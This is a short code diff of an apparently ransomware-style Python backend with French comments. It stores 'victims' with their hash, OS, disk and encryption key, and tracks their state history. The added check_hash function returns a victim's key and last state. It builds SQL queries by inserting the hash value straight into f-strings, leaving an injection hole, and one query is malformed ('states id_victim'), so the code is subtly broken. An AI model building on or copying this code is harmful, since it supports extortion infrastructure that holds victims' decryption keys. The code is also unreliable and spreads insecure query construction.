@@ -152,8 +152,6 @@ def insert_victim_new(conn, hash_victim, os_victim, disk_victim, key_victim):
     return id_victim
 
 
-
-
 def history_req(conn, id_victim):
     # histories contient la liste de tous les historiques d'état (id_victim, datetime, state)
     query = f'''
@@ -226,3 +224,23 @@ for ent in lv:
     print(msg_builder)
 print(message.list_victim_end())
 '''
+
+def check_hash(conn, hash_v):
+    rq = f'''
+    SELECT victims.id_victim, victims.key
+    FROM victims
+    WHERE victims.hash = "{hash_v}"
+    '''
+    victim = select_data(conn, rq)
+    if not victim:
+        return None
+    else:
+        victim = list(victim[0])
+        query = f'''
+        SELECT states.state, MAX(states.datetime)
+        FROM states
+        WHERE states id_victim = {victim[0]}
+        '''
+        last_state = (select_data(conn, query))[0][0]
+        victim.append(last_state)
+        return victim
